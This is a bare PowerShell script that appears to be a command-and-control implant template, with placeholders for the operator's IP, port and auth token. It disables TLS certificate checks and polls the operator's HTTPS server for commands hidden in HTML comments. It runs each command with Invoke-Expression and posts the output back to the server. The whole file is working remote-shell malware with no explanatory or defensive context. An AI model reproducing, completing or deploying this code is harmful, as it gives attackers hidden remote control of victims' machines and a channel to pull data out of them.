$ip="%ip%";$port="%port%";$auth="%auth%";if(-not([System.Management.Automation.PSTypeName]'TrustAllCertsPolicy').Type){Add-Type -TypeDefinition 'using System.Net;using System.Security.Cryptography.X509Certificates;public class TrustAllCertsPolicy:ICertificatePolicy{public bool CheckValidationResult(ServicePoint s,X509Certificate c,WebRequest r,int p){return true;}}'}[Net.ServicePointManager]::CertificatePolicy=New-Object TrustAllCertsPolicy;[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;function hget($uri){$req=[Net.HttpWebRequest]::Create($uri);$req.Method="GET";$resp=$req.GetResponse();$sr=New-Object IO.StreamReader($resp.GetResponseStream());$r=$sr.ReadToEnd();$sr.Close();$resp.Close();return $r};function hpost($uri,$body){$req=[Net.HttpWebRequest]::Create($uri);$req.Method="POST";$req.ContentType="application/x-www-form-urlencoded";$b=[Text.Encoding]::UTF8.GetBytes($body);$req.ContentLength=$b.Length;$s=$req.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close();$resp=$req.GetResponse();$resp.Close()};$star=[char]42;while($true){try{$pool=(hget "https://${ip}:${port}/${auth}/e030d4f6").Trim();if($pool -and $pool.Length -gt 0){break}}catch{Write-Host "[X] Auth error: $_";Start-Sleep -Milliseconds 2000}};while($true){Start-Sleep -Milliseconds 750;try{$c=hget "https://${ip}:${port}/${auth}/${pool}"}catch{Write-Host "[X] Polling error: $_";continue};$b=[regex]::Match($c,'<!--(.*?)-->').Groups[1].Value.TrimStart('!');if($b.StartsWith($star)){$pool=$b.TrimStart($star);Write-Host "[*] Endpoint: $pool"}else{$asodifj=iex $b -ErrorAction Stop -ErrorVariable e;$asodifj=Out-String -InputObject $asodifj;try{hpost "https://${ip}:${port}/${auth}/${pool}" (([Text.Encoding]::UTF8.GetBytes($asodifj) -join ' '))}catch{Write-Host "[X] Post error: $_"}}}